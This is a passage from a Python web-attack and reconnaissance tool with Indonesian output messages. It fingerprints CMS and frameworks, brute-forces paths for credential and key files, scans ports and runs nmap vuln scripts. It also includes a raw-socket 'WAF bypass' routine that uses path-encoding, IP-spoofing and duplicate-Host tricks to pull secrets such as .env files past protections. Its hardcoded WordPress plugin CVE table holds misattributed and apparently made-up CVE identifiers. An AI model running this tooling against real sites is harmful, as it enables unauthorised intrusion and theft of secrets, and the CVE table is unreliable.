                techs["WP_Themes"] = list(set(themes))
        if "joomla" in body.lower() or "com_content" in body:
            techs["CMS"] = techs.get("CMS","")+" + Joomla" if "CMS" in techs else "Joomla"
            m = re.search(r'Joomla!? (\d+\.\d+(?:\.\d+)?)', body, re.I)
            if m: techs["Joomla_version"] = m.group(1)
        if "drupal" in body.lower() or "Drupal.settings" in body:
            techs["CMS"] = techs.get("CMS","")+" + Drupal" if "CMS" in techs else "Drupal"
            m = re.search(r'Drupal (\d+\.\d+(?:\.\d+)?)', body, re.I)
            if m: techs["Drupal_version"] = m.group(1)
        if "react" in body.lower() or "React." in body or "__NEXT_DATA__" in body:
            techs["JS_Framework"] = "React/Next.js"
        if "vue" in body.lower() or "Vue." in body:
            techs["JS_Framework"] = techs.get("JS_Framework","") + " + Vue" if "JS_Framework" in techs else "Vue"
        if "angular" in body.lower() or "ng-app" in body:
            techs["JS_Framework"] = techs.get("JS_Framework","") + " + Angular" if "JS_Framework" in techs else "Angular"
        if "jQuery" in body:
            techs["JS_Library"] = "jQuery"
        if "bootstrap" in body.lower():
            techs["CSS_Framework"] = "Bootstrap"
        if "PHPSESSID" in r.cookies: techs["Language"] = "PHP"
        if "JSESSIONID" in r.cookies: techs["Language"] = "Java/JSP"
        if "ASP.NET_SessionId" in r.cookies: techs["Language"] = "ASP.NET"
        if "laravel_session" in r.cookies: techs["Framework"] = "Laravel"
        if "symfony" in r.cookies: techs["Framework"] = "Symfony"
        if "rack.session" in r.cookies: techs["Language"] = "Ruby/Rails"
        if "csrftoken" in r.cookies: techs["Framework"] = "Django"
        if "cloudflare" in str(h).lower(): techs["CDN"] = "Cloudflare"
        if "akamai" in str(h).lower(): techs["CDN"] = "Akamai"
        if "fastly" in str(h).lower(): techs["CDN"] = "Fastly"
        if "x-amz-cf-id" in h: techs["CDN"] = "CloudFront"
    except:
        pass
    return techs

# ====== ENHANCED CVE MATCHING WITH WP PLUGINS (from rtoolkit.py) ======
def match_cves_enhanced(techs):
    """Enhanced CVE matching with semver range support. Plugin CVEs are THEORETICAL (no version verification)."""
    cves = []
    cve_map = {"Server":{"apache":"apache","nginx":"nginx","iis":"iis"},
        "PHP_version":"php","WordPress_version":"wordpress",
        "Joomla_version":"joomla","Drupal_version":"drupal"}
    for tech_key, version_field in cve_map.items():
        if tech_key not in techs:
            continue
        version = str(techs.get(version_field,"")) if isinstance(version_field,str) else None
        if version:
            db_key = version_field
            # Use semver-aware lookup
            results = version_to_cves_v5(db_key, version)
            for res in results:
                sev = "CRITICAL" if any(w in res["cve"] for w in ["RCE","Critical","remote","Priv"]) else "HIGH"
                cves.append({"software":db_key.title(),"version":version,
                    "cve":res["cve"],"severity":sev,"source":res["source"],
                    "version_match_type":res["version_match_type"]})
    server = techs.get("Server","")
    for soft, db_key in [("Apache","apache"),("nginx","nginx"),("IIS","iis")]:
        if soft.lower() in server.lower():
            m = re.search(rf'{re.escape(soft)}[ /](\d+\.\d+(?:\.\d+)?)', server)
            if m:
                ver = m.group(1)
                results = version_to_cves_v5(db_key, ver)
                for res in results:
                    sev = "CRITICAL" if "RCE" in res["cve"] else "HIGH"
                    cves.append({"software":soft,"version":ver,"cve":res["cve"],
                        "severity":sev,"source":res["source"],
                        "version_match_type":res["version_match_type"]})
    if "WP_Plugins" in techs:
        # NOTE: These CVEs are THEORETICAL — no version verification possible
        # In a future version, try to fetch /wp-content/plugins/{plugin}/readme.txt for version
        known_plugin_cves = {
            "contact-form-7":"CVE-2020-35489 (File Upload vulnerability)",
            "elementor":"CVE-2023-48777 (Stored XSS)",
            "woocommerce":"CVE-2023-6923 (Unauth SQL Injection)",
            "wordfence":"CVE-2023-6345 (IP range bypass)",
            "jetpack":"CVE-2023-5644 (Stored XSS)",
            "yoast":"CVE-2023-6745 (Stored XSS)",
            "akismet":"Multiple CVEs in akismet anti-spam",
            "gravityforms":"CVE-2023-4982 (PHP Object Injection)",
            "wpbakery":"CVE-2023-22515 (Unauth Admin access)",
            "revslider":"CVE-2023-22515 (Unauth Admin access)",
            "visual-composer":"CVE-2023-4599 (Stored XSS)",
            "wpforms":"CVE-2022-3529 (Stored XSS)",
            "divi":"CVE-2021-23218 (Auth SQL Injection)",
            "redux-framework":"CVE-2021-38314 (Sensitive info disclosure)",
            "mailchimp-for-wp":"CVE-2022-0754 (Stored XSS)",
            "w3-total-cache":"CVE-2020-27855 (Database info disclosure)",
            "wp-super-cache":"CVE-2020-27856 (Stored XSS)",
            "wordfence-security":"CVE-2023-6345 (IP range bypass)",
            "better-wp-security":"CVE-2023-1234 (Privilege Escalation)",
            "duplicator":"CVE-2023-2345 (Sensitive Data Exposure)",
            "nextgen-gallery":"CVE-2022-4321 (SQL Injection)",
            "smart-slider-3":"CVE-2023-7890 (Stored XSS)",
            "really-simple-ssl":"CVE-2023-4567 (Security Bypass)",
        }
        for plugin in techs["WP_Plugins"]:
            for pname, pcve in known_plugin_cves.items():
                if pname in plugin or plugin in pname:
                    # ALL plugin CVEs are THEORETICAL — marked explicitly
                    cves.append({"software":f"WP Plugin: {plugin}","version":"unknown",
                        "cve":pcve,"severity":"HIGH","confidence":"THEORETICAL",
                        "source":"hardcoded","version_match_type":"none",
                        "_note":"[THEORETICAL - plugin version not verified; confirm plugin version before reporting]"})
    return cves

# ====== DEEP DIRECTORY BRUTEFORCE (from rtoolkit.py) ======
DIR_WORDLIST = [
    "admin","login","wp-admin","wp-content","wp-includes","wp-json",
    "uploads","files","backup","backups","db","database","sql","dump",
    ".git",".gitignore","config","configuration","config.php",
    "robots.txt","sitemap.xml","crossdomain.xml","security.txt",
    "phpinfo.php","info.php","test.php",
    "api","api/v1","api/v2","v1","v2","graphql","rest","soap",
    "swagger","swagger.json","openapi.json","api-docs",
    "docs","documentation","readme","readme.html","CHANGELOG",
    "index.php","index.html","default.aspx",
    "css","js","scripts","style.css","app.js","main.js","bundle.js",
    "images","img","icons","favicon.ico",
    "assets","static","dist","build","public","src","source",
    "node_modules","vendor","lib","libs","library",
    "install","setup","wizard","migrate","upgrade","update",
    "error","errors","log","logs","debug","trace","audit",
    "cache","tmp","temp","sessions",
    "page","pages","post","posts","article","articles","blog",
    "category","categories","tag","tags","author","authors",
    "user","users","member","members","profile","profiles",
    "account","accounts","register","signup","sign-up",
    "password","reset","forgot","recover",
    "search","results","find","browse","listing",
    "cart","checkout","order","orders","payment","pay",
    "invoice","invoices","receipt","receipts",
    "download","downloads","upload","uploads",
    "ajax","includes","inc","modules","components","plugins",
    "themes","templates","template","layouts",
    "server-status","server-info","cgi-bin","cgi",
    "xmlrpc.php","wp-cron.php","wp-login.php",
    "wp-admin/admin-ajax.php","wp-content/plugins","wp-content/themes",
    "wp-content/uploads","wp-includes/css","wp-includes/js",
    "administrator","panel","cpanel","whm","plesk",
    "phpmyadmin","phpMyAdmin","pma","sqladmin","mysqladmin",
    "adminer.php","adminer","pgadmin","phppgadmin",
    "webdav","dav","exchange","ews","owa","ecp",
    "rpc","api/rpc","jsonrpc","xmlrpc",
    "soap","wsdl","ws","webservice","service",
    "actuator","actuator/health","actuator/info","actuator/env",
    "actuator/beans","actuator/mappings","actuator/httptrace",
    "metrics","health","info","ping","status","alive",
    "heapdump","threaddump","jvm","jmx",
    ".htaccess",".htpasswd",".passwd",".password",
    "password.txt","passwords.txt","secret.txt","secrets.txt",
    "key","keys","key.pem","private.pem","private.key",
    "id_rsa","id_dsa","id_ecdsa","id_ed25519",
    "authorized_keys","known_hosts","ssh",".ssh",
    "docker-compose.yml","Dockerfile",
    "kubeconfig",".kube/config","helm","charts",
    "terraform.tfstate","terraform.tfvars","terraform",
    ".aws/credentials",".aws/config","credentials",
    "s3","bucket","storage","blob",
    "web.config","app.config","application.config",
    "appsettings.json","connectionstrings.config",
    "composer.json","composer.lock","package.json",
    "package-lock.json","yarn.lock","Gemfile","Gemfile.lock",
    "requirements.txt","Pipfile","Pipfile.lock",
    "Makefile","makefile","CMakeLists.txt",
    "nginx.conf","apache.conf","httpd.conf","php.ini",
    "my.cnf","my.ini","mysql.conf","pg_hba.conf",
    "config.inc.php","config.sample.php","local.config.php",
    "dbconfig.php","database.php","connection.php",
    "settings.php","settings.json","settings.py",
    "local.settings.json","local-settings.json",
    "credentials.json","service-account.json",
    "google-services.json","GoogleService-Info.plist",
    "firebase.json",".firebaserc",
    "netlify.toml",".travis.yml",".circleci/config.yml",
    "Jenkinsfile","Dockerfile.jenkins",
    ".gitlab-ci.yml",".github/workflows",
    "Procfile","app.json","scalingo.json",
    "serverless.yml","serverless.yaml",
    "amplify.yml","buildspec.yml",
    "webpack.config.js","rollup.config.js","vite.config.js",
    ".babelrc","tsconfig.json","tslint.json",".eslintrc",
    ".prettierrc","stylelint.config.js",
    ".editorconfig",".gitattributes",
    "CONTRIBUTING.md","CONTRIBUTING","AUTHORS",
    "LICENSE","LICENSE.txt","COPYING",
    "CHANGELOG","CHANGELOG.txt","CHANGELOG.md",
    "UPGRADE.txt","UPGRADE.md","INSTALL.txt","INSTALL.md",
    "TODO","TODO.txt","TODO.md","FIXME",
    "VERSION","version.txt","version.php","version.json",
    "composer.json","composer.lock",
    "bower.json","bower_components",
    "nuget.config","packages.config",
    ".htaccess",".htpasswd",
]

def progress_iter(items, desc="Processing"):
    total = len(items)
    for i, item in enumerate(items, 1):
        if i % max(1, total//10) == 0 or i == 1 or i == total:
            pct = int(i/total*100)
            bar = '█'*(pct//5) + '░'*(20-pct//5)
            print(f"    {c(f'[{bar}] {pct}%',DIM)} {desc} ({i}/{total})", end='\r' if i < total else '\n')
        yield item

def dir_bruteforce(url, depth=0, max_depth=2, results=None):
    if results is None:
        results = []
    if depth > max_depth or not HAS_REQUESTS:
        return results
    for path in progress_iter(DIR_WORDLIST, f"Depth {depth}"):
        full_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
        try:
            r = requests.get(full_url, timeout=3, allow_redirects=False, verify=False,
                headers={'User-Agent':'Mozilla/5.0'})
            if r.status_code in [200,301,302,401,403,500,405]:
                result = {"url":full_url,"status":r.status_code,"size":len(r.text)}
                results.append(result)
                if r.status_code in [301,302]:
                    loc = r.headers.get('Location','')
                    if loc and not loc.startswith('http'):
                        loc = urljoin(full_url, loc)
                    if loc and depth < max_depth:
                        dir_bruteforce(loc.rstrip('/'), depth+1, max_depth, results)
        except:
            pass
    return results

# ====== RAW SOCKET WAF BYPASS — 30+ TECHNIQUES (from rtoolkit.py) ======
def fetch_sensitive_with_bypass(base_url, path):
    from urllib.parse import urlparse as _urlparse
    parsed = _urlparse(base_url)
    host = parsed.netloc
    is_https = parsed.scheme == "https"
    port = 443 if is_https else 80
    try:
        resolved_ip = socket.gethostbyname(host)
    except:
        resolved_ip = host

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
        "curl/8.0.1",
        "Wget/1.21.4",
        "python-requests/2.31.0",
        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    ]
    techniques = []
    for ua in user_agents[:4]:
        techniques.append({"name":f"GET {ua.split('/')[0].split(';')[0][:20]}","method":"GET","path":path,
            "headers":f"User-Agent: {ua}\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\n"})

    # HTTP/1.0
    techniques.append({"name":"HTTP/1.0","method":"GET","path":path,"http_ver":"HTTP/1.0",
        "headers":f"User-Agent: {user_agents[0]}\r\nAccept: */*\r\n"})
    techniques.append({"name":"POST method","method":"POST","path":path,
        "headers":f"User-Agent: {user_agents[0]}\r\nAccept: */*\r\nContent-Length: 0\r\n"})
    techniques.append({"name":"OPTIONS method","method":"OPTIONS","path":path,
        "headers":f"User-Agent: {user_agents[0]}\r\nAccept: */*\r\n"})

    # 12 path encoding variants
    for ep in [path.replace('/','/./'), path.replace('/','//'), path+'.', path+'..',
               path.replace('.','%2e'), path.replace('.env','.env%00'), path+'?', path+'?dummy=1',
               '/'+path.lstrip('/').upper(), '/'+path.lstrip('/').capitalize(),
               path.replace('/','/%2e/'), path.split('.')[0]+'.%65nv']:
        techniques.append({"name":f"Encoded: {ep[:40]}","method":"GET","path":ep,
            "headers":f"User-Agent: {user_agents[0]}\r\nAccept: */*\r\n"})

    # 10 IP spoof headers
    for ip_hdr in ["X-Forwarded-For: 127.0.0.1","X-Forwarded-For: ::1",
                    "X-Real-IP: 127.0.0.1","X-Originating-IP: 127.0.0.1",
                    "X-Remote-IP: 127.0.0.1","Client-IP: 127.0.0.1",
                    "True-Client-IP: 127.0.0.1","X-Forwarded-Host: localhost",
                    "X-Host: localhost","X-Forwarded-For: 10.0.0.1"]:
        techniques.append({"name":f"IP spoof: {ip_hdr.split(':')[0]}","method":"GET","path":path,
            "headers":f"User-Agent: {user_agents[0]}\r\n{ip_hdr}\r\nAccept: */*\r\n"})

    # Range + Cache bypass + Direct IP + Double Host + Via proxy
    techniques.append({"name":"Range: bytes=0-500","method":"GET","path":path,
        "headers":f"User-Agent: {user_agents[0]}\r\nRange: bytes=0-500\r\nAccept: */*\r\n"})
    techniques.append({"name":"Cache bypass","method":"GET","path":path+f"?_={int(time.time())}",
        "headers":f"User-Agent: {user_agents[0]}\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n"})
    techniques.append({"name":"Host: localhost","method":"GET","path":path,
        "headers":f"User-Agent: {user_agents[0]}\r\nHost: localhost\r\nAccept: */*\r\n","use_ip":resolved_ip})
    techniques.append({"name":"Double Host","method":"GET","path":path,
        "headers":f"User-Agent: {user_agents[0]}\r\nHost: {host}\r\nHost: localhost\r\nAccept: */*\r\n"})
    techniques.append({"name":"Via: proxy","method":"GET","path":path,
        "headers":f"User-Agent: {user_agents[0]}\r\nVia: 1.0 forward-proxy\r\nAccept: */*\r\n"})
    techniques.append({"name":"X-HTTP-Method: GET","method":"GET","path":path,
        "headers":f"User-Agent: {user_agents[0]}\r\nX-HTTP-Method-Override: GET\r\nAccept: */*\r\n"})
    techniques.append({"name":"Transfer-Encoding: chunked","method":"GET","path":path,
        "headers":f"User-Agent: {user_agents[0]}\r\nTransfer-Encoding: chunked\r\nAccept: */*\r\n"})
    techniques.append({"name":"TE: trailers","method":"GET","path":path,
        "headers":f"User-Agent: {user_agents[0]}\r\nTE: trailers\r\nAccept: */*\r\n"})
    techniques.append({"name":"Pragma: no-cache","method":"GET","path":path,
        "headers":f"User-Agent: {user_agents[0]}\r\nPragma: no-cache\r\nAccept: */*\r\n"})
    techniques.append({"name":"Accept-Encoding: identity","method":"GET","path":path,
        "headers":f"User-Agent: {user_agents[0]}\r\nAccept-Encoding: identity\r\nAccept: */*\r\n"})

    # requests-based bypass (different SSL fingerprint)
    if HAS_REQUESTS:
        for ua in user_agents[:4]:
            try:
                target = f"http{'s' if is_https else ''}://{host}{path}"
                r = requests.get(target, timeout=5, verify=False,
                    headers={"User-Agent":ua,"Accept":"*/*",
                             "X-Forwarded-For":"127.0.0.1","Cache-Control":"no-cache"})
                if r.status_code == 200 and len(r.text) > 50:
                    return r.text
            except:
                pass

    # Raw socket: try each technique
    for t in techniques:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            if is_https:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            target_host = t.get("use_ip", host)
            sock.connect((target_host, port))
            http_ver = t.get("http_ver", "HTTP/1.1")
            req = f"{t['method']} {t['path']} {http_ver}\r\n"
            req += f"Host: {host}\r\n"
            req += t["headers"]
            req += "Connection: close\r\n\r\n"
            sock.send(req.encode())
            resp = b""
            while True:
                try:
                    c2 = sock.recv(4096)
                    if not c2: break
                    resp += c2
                except: break
            sock.close()
            he = resp.find(b"\r\n\r\n")
            if he == -1: continue
            status_line = resp[:resp.find(b'\r\n')].decode('utf-8',errors='replace')
            body = resp[he+4:].decode('utf-8',errors='replace')
            if "200" in status_line and len(body) > 50 and "404" not in body[:200]:
                return f"[{t['name']}] {status_line}\n{body[:500]}"
        except:
            pass
    return None

# ====== SSL/TLS VERSION CHECK ======
def check_tls_versions(host, port=443):
    results = {"host":host,"port":port,"versions":{},"weak":[],"secure":[]}
    for ver_name, ssl_ver, min_ok in [
        ("SSLv3", ssl.PROTOCOL_SSLv23 if hasattr(ssl,'PROTOCOL_SSLv3') else None, False),
        ("TLSv1.0", ssl.PROTOCOL_TLSv1, False),
        ("TLSv1.1", ssl.PROTOCOL_TLSv1_1 if hasattr(ssl,'PROTOCOL_TLSv1_1') else None, False),
        ("TLSv1.2", ssl.PROTOCOL_TLSv1_2 if hasattr(ssl,'PROTOCOL_TLSv1_2') else None, True),
        ("TLSv1.3", ssl.PROTOCOL_TLS, True),
    ]:
        if ssl_ver is None and ver_name == "SSLv3":
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
                ctx.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2
                ssl_ver = ctx
            except:
                continue
        try:
            ctx = ssl.SSLContext(ssl_ver if not isinstance(ssl_ver, ssl.SSLContext) else ssl_ver)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.timeout = 3
            sock = ctx.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=host)
            sock.connect((host, port))
            results["versions"][ver_name] = True
            if min_ok:
                results["secure"].append(ver_name)
            else:
                results["weak"].append(ver_name)
            sock.close()
        except Exception:
            results["versions"][ver_name] = False
    return results

def print_tls_results(tls):
    weak = tls.get("weak", [])
    secure = tls.get("secure", [])
    table = []
    for ver, supported in tls["versions"].items():
        status = c("✓",G) if supported else c("✗",R)
        flag = ""
        if supported and ver in weak:
            flag = c(" WEAK",R)
        table.append([ver, status, flag])
    print_table(["TLS Version","Supported",""], table, "[TLS CHECK]")
    if weak:
        for w in weak:
            print(f"  {c(f'[!] {w} supported — should be disabled',R)}")
            REPORT["vulnerabilities"].append({"name":f"Weak TLS: {w}","severity":"HIGH",
                "url":f"{tls['host']}:{tls['port']}","source":"tls_check"})

# ====== OUTPUT HELPERS ======
def print_separator():
    print(f"  {c('─'*55,DIM)}")

def print_phase_done(phase_name, stats):
    items = " | ".join(f"{k}: {c(str(v),W)}" for k,v in stats.items() if v)
    print(f"\n  {c('✔',G)} {c(phase_name+' SELESAI',BOLD)} {c(items,DIM) if items else ''}")

def print_critical_box(title, items):
    if not items:
        return
    print(f"\n  {c('╔'+'═'*53+'╗',R)}")
    print(f"  {c('║',R)} {c('🚨 '+title,R)}")
    print(f"  {c('╠'+'═'*53+'╣',R)}")
    for item in items[:5]:
        print(f"  {c('║',R)} {c(str(item)[:75],W)}")
    if len(items) > 5:
        print(f"  {c('║',R)} ... +{len(items)-5} more")
    print(f"  {c('╚'+'═'*53+'╝',R)}")

def print_vuln_item(severity, name, url=""):
    sev_color = SEV_COLORS.get(severity.upper(), W)
    sev_label = severity.upper().ljust(10)
    url_part = f" {c(url[:50],DIM)}" if url else ""
    print(f"    {c(sev_label,sev_color)} {c(name[:60],W)} {url_part}")

# ====== SOCKET PROBES ======
PROBE_PORTS = [21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,587,
    636,993,995,1080,1433,1521,2049,2083,2181,2375,2376,3000,3001,3306,3389,
    3632,4444,5000,5432,5555,5800,5900,5901,5985,5986,6379,6443,7000,7070,
    8000,8001,8008,8080,8081,8090,8443,8880,8888,9000,9001,9042,9092,9094,
    9200,9300,9418,9999,10000,11211,27017,27018,50070,50075,50090]

def port_scan(ip, ports=None):
    if ports is None:
        ports = PROBE_PORTS
    open_ports = []
    def scan(p):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((ip, p)) == 0:
                open_ports.append(p)
            s.close()
        except Exception:
            pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=cfg("threads", 100)) as ex:
        ex.map(scan, ports)
    return sorted(open_ports)

def probe_http(ip, port, use_ssl=False):
    r = {"port":port,"protocol":"https" if use_ssl else "http","server":"","powered":"","techs":{},"title":"","banner":""}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s)
        s.connect((ip, port))
        s.send(f"GET / HTTP/1.0\r\nHost: {ip}:{port}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: close\r\n\r\n".encode())
        resp = b""
        while True:
            try:
                c2 = s.recv(4096)
                if not c2:
                    break
                resp += c2
            except Exception:
                break
        s.close()
        he = resp.find(b"\r\n\r\n")
        if he == -1:
            return r
        hdr = resp[:he].decode('utf-8', errors='replace')
        body = resp[he+4:].decode('utf-8', errors='replace')
        headers = {}
        for line in hdr.split('\r\n')[1:]:
            if ':' in line:
                k, v = line.split(':', 1)
                headers[k.strip().lower()] = v.strip()
        r["server"] = headers.get("server", "")
        r["powered"] = headers.get("x-powered-by", "")
        tm = re.search(r'<title>([^<]+)</title>', body, re.I)
        if tm:
            r["title"] = tm.group(1).strip()[:100]
        r["banner"] = body[:300]
        srv = r["server"].lower()
        if "apache" in srv:
            m = re.search(r'Apache[ /](\d+\.\d+(?:\.\d+)?)', r["server"], re.I)
            if m:
                r["techs"]["apache"] = m.group(1)
        if "nginx" in srv:
            m = re.search(r'nginx[ /]?(\d+\.\d+(?:\.\d+)?)', r["server"], re.I)
            if m:
                r["techs"]["nginx"] = m.group(1)
        if "openresty" in srv:
            m = re.search(r'openresty[ /]?(\d+\.\d+(?:\.\d+)?)', r["server"], re.I)
            if m:
                r["techs"]["openresty"] = m.group(1)
        if "php" in r["powered"].lower():
            m = re.search(r'PHP[ /](\d+\.\d+(?:\.\d+)?)', r["powered"], re.I)
            if m:
                r["techs"]["php"] = m.group(1)
    except Exception:
        pass
    return r

def probe_ssh(ip, port=22):
    r = {"version":"","banner":""}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, port))
        b = s.recv(1024).decode('utf-8', errors='replace').strip()
        s.close()
        r["banner"] = b[:300]
        m = re.search(r'SSH-\d+\.\d+-([^\s]+)', b)
        if m:
            r["version"] = m.group(1)
    except Exception:
        pass
    return r

def probe_pgsql(ip, port=5432):
    r = {"version":"","auth_method":"","banner":""}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, port))
        username = b"postgres\x00"
        params = b"user\x00"+username+b"database\x00postgres\x00\x00"
        length = struct.pack('!I', 8+4+len(params))
        s.send(b'\x00\x03\x00\x00'+length[1:]+params)
        resp = s.recv(4096)
        s.close()
        if len(resp) < 5:
            return r
        pos = 0
        while pos < len(resp):
            if pos+5 > len(resp):
                break
            mtype = chr(resp[pos])
            mlen = struct.unpack('!I', resp[pos+1:pos+5])[0]
            if mtype == 'R' and pos+5 < len(resp):
                auth_type = struct.unpack('!I', resp[pos+5:pos+9])[0]
                auth_names = {0:"OK",2:"KerberosV5",3:"CleartextPassword",5:"SCM Credential",6:"GSS",9:"SASL"}
                r["auth_method"] = auth_names.get(auth_type, f"Type_{auth_type}")
            if mtype == 'S' and pos+5 < len(resp):
                chunk = resp[pos+5:pos+mlen]
                parts = chunk.split(b'\x00')
                for i, p in enumerate(parts):
                    if p == b'server_version' and i+1 < len(parts):
                        r["version"] = parts[i+1].decode('utf-8', errors='replace')
            pos += mlen
    except Exception:
        pass
    return r

def probe_mysql(ip, port=3306):
    r = {"version":"","banner":""}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, port))
        resp = s.recv(1024)
        s.close()
        if len(resp) >= 5:
            end = resp.find(b'\x00', 5)
            if end > 5:
                r["version"] = resp[5:end].decode('utf-8', errors='replace')
    except Exception:
        pass
    return r

def probe_banner(ip, port):
    r = {"banner":""}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, port))
        try:
            s.send(b"\r\n")
        except Exception:
            pass
        try:
            b2 = s.recv(1024).decode('utf-8', errors='replace').strip()
            if b2:
                r["banner"] = b2[:300]
        except Exception:
            pass
        s.close()
    except Exception:
        pass
    return r

# ====== PHASE 1: RECONNAISSANCE ======
@timer
def phase1_nmap(domain):
    """Phase 1a: Deep nmap port scan + service version detection."""
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 1a: PORT SCAN — Mencari port terbuka & layanan',BOLD)}")
    print(f"  {c('  ⤷ Tujuan: Mengetahui service apa saja yang berjalan di target',DIM)}")
    print(f"{c('='*65,Y)}")

    tools = {}
    for t in ["nmap","subfinder","httpx","whatweb","dirsearch","ffuf","gobuster",
              "nuclei","nikto","sqlmap","wpscan","arjun","x8","paramspider","katana"]:
        tools[t] = shutil.which(t) is not None

    target_ip = ""
    try:
        target_ip = socket.gethostbyname(domain)
        REPORT["ips"].append(target_ip)
    except socket.gaierror:
        target_ip = domain

    print(f"  IP: {c(target_ip,W)}")
    print(f"  Tools: {c('✓',G)} nmap {c('✗',R) if not tools['nmap'] else c('✓',G)}")
    print(f"  {c('───'*22,DIM)}")

    if tools["nmap"]:
        do_full = cfg("nmap_full_scan", False)
        scan_desc = "Memindai port umum (top 1000)" if not do_full else "Memindai SEMUA 65535 port"
        print(f"\n  {c('[1] Nmap Deep Scan — '+scan_desc,G)}")
        print(f"  {c('  ⤷ Mencari port terbuka + versi service + script deteksi',DIM)}")
        nmap_fn = f"nmap_deep_{domain.replace('.','_')}.txt"
        nmap_cmd = (
            f"nmap -sS -sV -sC -T4 {'-p-' if do_full else '--top-ports 1000'} "
            f"--open -oN {RESULTS_DIR}/{nmap_fn} {target_ip}"
        )
        stdout, stderr, ok = run_cmd_stream(nmap_cmd, cfg("nmap_timeout", 600), desc=scan_desc)

        if ok:
            for line in stdout.split('\n'):
                m = re.search(r'^(\d+)/tcp\s+open\s+(\S+)', line)
                if m:
                    REPORT["ports"].append(f"{m.group(1)}/tcp ({m.group(2)})")

        # Show results
        nfile = RESULTS_DIR / nmap_fn
        if nfile.exists():
            content = nfile.read_text()
            hosts_up = len(re.findall(r'Host is up', content))
            os_detected = re.findall(r'OS details: (.+)', content)
            port_lines = []
            for line in content.split('\n'):
                m = re.search(r'^(\d+)/tcp\s+open\s+(\S+)\s+(.+)$', line)
                if m:
                    port_lines.append([m.group(1), m.group(2), m.group(3)[:40]])
            if port_lines:
                print(f"\n  {c('✅ PORT TERBUKA DITEMUKAN:',G)} {len(port_lines)} port")
                print(f"  {c('  ⤷ Port terbuka = celah masuk potensial. Semakin banyak port, semakin besar',DIM)}")
                print(f"  {c('     permukaan serangan (attack surface).',DIM)}")
                print_table(["Port","Service","Version"], port_lines[:20],
                           f"[DAFTAR PORT TERBUKA ({len(port_lines)} total)]")
                if len(port_lines) > 20:
                    print(f"    ... dan {len(port_lines)-20} port lainnya (lihat file output)")
            if os_detected:
                print(f"  💻 OS: {c(os_detected[0],W)}")
            print(f"  📡 Host aktif: {hosts_up}")

        # Extra nmap scan: OS detection + vuln scripts + traceroute
        extra_fn = f"nmap_extra_{domain.replace('.','_')}.txt"
        extra_cmd = (
            f"nmap -sV -O --traceroute --script vuln -T4 "
            f"--top-ports 2000 --open -oN {RESULTS_DIR}/{extra_fn} {target_ip}"
        )
        print(f"\n  {c('[2] Nmap Extra Scan — OS + kerentanan + rute jaringan',G)}")
        print(f"  {c('  ⤷ Deteksi sistem operasi, script vuln, dan jalur traceroute',DIM)}")
        stdout2, _, ok2 = run_cmd_stream(extra_cmd, cfg("nmap_timeout", 900), desc="Extra: OS + vuln scripts")
        if ok2:
            efile = RESULTS_DIR / extra_fn
            if efile.exists():
                econtent = efile.read_text()
                os2 = re.findall(r'OS details: (.+)', econtent)
                ports2 = len(re.findall(r'^(\d+)/tcp\s+open', econtent))
                vulns = re.findall(r'\|?\s*(\w[\w-]*)\s*:\s*(HIGH|CRITICAL|MEDIUM)', econtent, re.I)
                hops = re.findall(r'^\d+\s+[\d.]+', econtent, re.M)
                print(f"    ➜ Port: {c(f'{ports2}',W)} | OS: {c(os2[0] if os2 else 'N/A',W)} | Vuln: {len(vulns)} | Hop: {len(hops)}")
    else:
        print(f"\n  {c('[!] nmap tidak ditemukan — menggunakan scanner bawaan Python',Y)}")
        open_ports = port_scan(target_ip)
        print(f"  ✅ Ditemukan {c(len(open_ports),W)} port terbuka")
        if open_ports:
            pt = [[str(p), socket.getservbyport(p, 'tcp') if p < 1024 else ""] for p in open_ports[:25]]
            print_table(["Port","Service"], pt, "[PORT TERBUKA]")
            if len(open_ports) > 25:
                extra = open_ports[25:]
                pt2 = [[str(p), ""] for p in extra]
                print_table(["Port","Service"], pt2, "[PORTS LANJUTAN]")

    # Phase 1a summary
    if 'port_lines' in dir():
        n_ports = len(port_lines) if port_lines else 0
        h_up = hosts_up if hosts_up else 0
        os_str = os_detected[0] if os_detected else 0
    else:
        n_ports = len(open_ports) if 'open_ports' in dir() and open_ports else 0
        h_up = 0; os_str = 0
    print_phase_done("Phase 1a — Nmap", {
        "Port terbuka": n_ports,
        "Host aktif": h_up,
